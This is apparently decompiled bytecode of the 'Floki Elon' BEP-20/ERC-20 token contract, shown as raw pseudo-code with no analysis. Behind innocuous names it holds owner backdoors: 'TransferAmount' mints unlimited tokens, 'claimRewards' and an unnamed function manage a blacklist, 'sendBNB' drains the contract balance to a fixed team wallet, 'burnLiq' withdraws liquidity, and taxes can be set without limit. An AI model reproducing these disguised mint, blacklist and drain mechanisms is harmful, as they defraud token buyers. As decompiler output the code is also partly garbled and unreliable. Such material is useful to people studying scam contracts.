contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
const name = 'Floki Elon', 0

const decimals = 9

const sub_504762e7(?) = 1000 * 10^18

const TeamWallet = 0xd98165e63e75149f2e1210842069ac9e38fca10c

const symbol = 'FLOKIELON', 0


address owner;
mapping of uint256 balanceOf;
mapping of struct allowance;
mapping of uint256 stor3;
mapping of uint8 stor4;
uint256 totalSupply;
uint256 balanceLimit;
uint256 sellLimit;
uint256 buyLimit;
uint8 stor13;
uint8 stor13; offset 8
uint8 stor13; offset 16
uint8 stor13; offset 24
uint8 stor13; offset 32
uint8 stor13; offset 40
address stor14;
uint256 totalLPBNB;
uint8 stor16;
uint8 sellLockDisabled; offset 8
uint256 stor16; offset 8
uint256 sellLockTime;
uint8 manualConversion;
uint8 buybackEnabled; offset 8
address stor18; offset 16
uint256 stor18; offset 8
uint256 stor19;

function getSellLockTimeInSeconds() {
    return sellLockTime
}

function buybackEnabled() {
    return bool(buybackEnabled)
}

function totalSupply() {
    return totalSupply
}

function sellLimit() {
    return sellLimit
}

function buyLimit() {
    return buyLimit
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function balanceLimit() {
    return balanceLimit
}

function manualConversion() {
    return bool(manualConversion)
}

function sellLockDisabled() {
    return bool(sellLockDisabled)
}

function getOwner() {
    return owner
}

function totalLPBNB() {
    return totalLPBNB
}

function owner() {
    return owner
}

function sub_a8d8744b(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor4[arg1])
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)].field_0
}

function sellLockTime() {
    return sellLockTime
}

function _fallback() payable {
  stop
}

function getLimits() {
    return balanceLimit / 10^9, sellLimit / 10^9
}

function getBurnedTokens() {
    if 1000 * 10^18 < totalSupply:
        revert with 'NH{q', 17
    return (-totalSupply + 1000 * 10^18 / 10^9)
}

function SetupAntiBots() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor18.field_8) = 1
}

function SetupAntiWhale() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor18.field_8) = 0
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function AddressResetSellLock() {
    if block.timestamp > -sellLockTime - 1:
        revert with 'NH{q', 17
    stor3[address(msg.sender)] = block.timestamp + sellLockTime
}

function getLiquidityReleaseTimeInSeconds() {
    if block.timestamp >= stor19:
        return 0
    if stor19 < block.timestamp:
        revert with 'NH{q', 17
    return (stor19 - block.timestamp)
}

function claimRewards(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor4[address(arg1)] = 0
}

function getTaxes() {
    return uint8(stor13.field_0), 
           uint8(stor13.field_0),
           uint8(stor13.field_0),
           uint8(stor13.field_0),
           uint8(stor13.field_8),
           uint8(stor13.field_0)
}

function TeamSwitchManualBNBConversion(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    manualConversion = uint8(arg1)
}

function SetupLiquidityTokenAddress(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    address(stor18.field_16) = arg1
}

function TeamDisableSellLock(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor16.field_8) = Mask(248, 0, arg1)
}

function sendBNB() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    call 0xd98165e63e75149f2e1210842069ac9e38fca10c with:
       value eth.balance(this.address) wei
         gas gas_remaining wei
    require ext_call.success
}

function changeTax(uint8 arg1, uint8 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    uint8(stor13.field_0) = arg1
    uint8(stor13.field_8) = arg2
}

function getAddressSellLockTimeInSeconds(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor3[address(arg1)] <= block.timestamp:
        return 0
    if stor3[address(arg1)] < block.timestamp:
        revert with 'NH{q', 17
    return (stor3[address(arg1)] - block.timestamp)
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0, 'Approve from zero'
    if not arg1:
        revert with 0, 'Approve to zero'
    allowance[address(msg.sender)][address(arg1)].field_0 = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function TransferAmount(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0, 'ERC20: burn to the zero address'
    if totalSupply > -arg2 - 1:
        revert with 'NH{q', 17
    totalSupply += arg2
    if balanceOf[address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, 0, arg1);
}

function TeamUpdateLimits(uint256 arg1, uint256 arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg1 and 10^9 > -1 / arg1:
        revert with 'NH{q', 17
    if arg2 and 10^9 > -1 / arg2:
        revert with 'NH{q', 17
    if arg3 and 10^9 > -1 / arg3:
        revert with 'NH{q', 17
    balanceLimit = 10^9 * arg1
    sellLimit = 10^9 * arg2
    buyLimit = 10^9 * arg3
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)].field_0 > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0, 'Approve from zero'
    if not arg1:
        revert with 0, 'Approve to zero'
    allowance[address(msg.sender)][address(arg1)].field_0 += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)].field_0 + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)].field_0 < arg2:
        revert with 0, '<0 allowance'
    if not msg.sender:
        revert with 0, 'Approve from zero'
    if not arg1:
        revert with 0, 'Approve to zero'
    allowance[address(msg.sender)][address(arg1)].field_0 -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)].field_0 - arg2), msg.sender, arg1);
    return 1
}

function sub_78bef0d5(?) {
    require calldata.size - 4 >= 32
    require cd[4] <= test266151307()
    require cd[4] + 35 < calldata.size
    require ('cd', 4).length <= test266151307()
    require cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    idx = 0
    while idx < ('cd', 4).length:
        require cd[((32 * idx) + cd[4] + 36)] == address(cd[((32 * idx) + cd[4] + 36)])
        mem[0] = address(cd[((32 * idx) + cd[4] + 36)])
        mem[32] = 4
        stor4[address(cd[((32 * idx) + cd[4] + 36)])] = 1
        if idx == -1:
            revert with 'NH{q', 17
        idx = idx + 1
        continue 
}

function TeamSetTaxes(uint8 arg1, uint8 arg2, uint8 arg3, uint8 arg4, uint8 arg5, uint8 arg6) {
    require calldata.size - 4 >= 192
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg4 == arg4
    require arg5 == arg5
    require arg6 == arg6
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg1 > -arg2 + 255:
        revert with 'NH{q', 17
    if uint8(arg1 + arg2) > -arg3 + 255:
        revert with 'NH{q', 17
    if uint8(uint8(arg1 + arg2) + arg3) != 100:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'burn+liq+marketing needs to equal 100%'
    uint8(stor13.field_24) = arg1
    uint8(stor13.field_32) = arg2
    uint8(stor13.field_40) = arg3
    uint8(stor13.field_0) = arg4
    uint8(stor13.field_8) = arg5
    uint8(stor13.field_16) = arg6
}

function burnLiq() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require ext_code.size(address(stor18.field_16))
    staticcall address(stor18.field_16).0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_code.size(address(stor18.field_16))
    call address(stor18.field_16).approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args stor14, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    require ext_code.size(stor14)
    call stor14.removeLiquidityETHSupportingFeeOnTransferTokens(address arg1, uint256 arg2, uint256 arg3, uint256 arg4, address arg5, uint256 arg6) with:
         gas gas_remaining wei
        args address(this.address), ext_call.return_data[0], 0, 0, address(this.address), block.timestamp
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
}

function TeamCreateLPandBNB() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    uint8(stor16.field_0) = 1
    if uint8(stor13.field_32) > -uint8(stor13.field_40) + 255:
        revert with 'NH{q', 17
    if balanceOf[address(this.address)] >= sellLimit / 5:
        if uint8(uint8(stor13.field_32) + uint8(stor13.field_40)):
            if sellLimit / 5 and uint8(stor13.field_32) > -1 / sellLimit / 5:
                revert with 'NH{q', 17
            if not uint8(uint8(stor13.field_32) + uint8(stor13.field_40)):
                revert with 'NH{q', 18
            if sellLimit / 5 < sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)):
                revert with 'NH{q', 17
            if sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) < sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2:
                revert with 'NH{q', 17
            if -sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2 > -(sellLimit / 5) - 1:
                revert with 'NH{q', 17
            if not this.address:
                revert with 0, 'Approve from zero'
            if not stor14:
                revert with 0, 'Approve to zero'
            allowance[address(this.address)][stor14].field_0 = -(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5)
            emit Approval((-(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5)), this.address, stor14);
            mem[128] = this.address
            require ext_code.size(stor14)
            staticcall stor14.WETH() with:
                    gas gas_remaining wei
            mem[192] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[160] = ext_call.return_data[12 len 20]
            mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 196] = -(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5)
            idx = 0
            s = 128
            t = ceil32(return_data.size) + 388
            while idx < 2:
                mem[t] = mem[s + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(stor14)
            call stor14.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args -(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5), 0, 160, address(this.address), block.timestamp, 2, mem[ceil32(return_data.size) + 388 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            if eth.balance(this.address) < eth.balance(this.address):
                revert with 'NH{q', 17
            if False and (sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40))) - (sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) > 0:
                revert with 'NH{q', 17
            if not -(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5):
                revert with 'NH{q', 18
            if totalLPBNB > -(0 / -(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5)) - 1:
                revert with 'NH{q', 17
            totalLPBNB += 0 / -(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5)
            if not this.address:
                revert with 0, 'Approve from zero'
            if not stor14:
                revert with 0, 'Approve to zero'
            allowance[address(this.address)][stor14].field_0 = sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2
            allowance[address(this.address)][stor14].field_255 = 0
            emit Approval((sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2), this.address, stor14);
            require ext_code.size(stor14)
            call stor14.addLiquidityETH(address arg1, uint256 arg2, uint256 arg3, uint256 arg4, address arg5, uint256 arg6) with:
               value 0 / -(sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40)) / 2) + (sellLimit / 5) wei
                 gas gas_remaining wei
                args address(this.address), Mask(255, 1, sellLimit / 5 * uint8(stor13.field_32) / uint8(uint8(stor13.field_32) + uint8(stor13.field_40))), 0, 0, address(this.address), block.timestamp
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 96
            require ext_call.return_data[0] == ext_call.return_data[0]
            require ext_call.return_data[32] == ext_call.return_data[32]
            require ext_call.return_data[64] == ext_call.return_data[64]
            if eth.balance(this.address) < eth.balance(this.address):
                revert with 'NH{q', 17
            call 0xd98165e63e75149f2e1210842069ac9e38fca10c with:
                 gas 30000 wei
    uint8(stor16.field_0) = 0
}



}
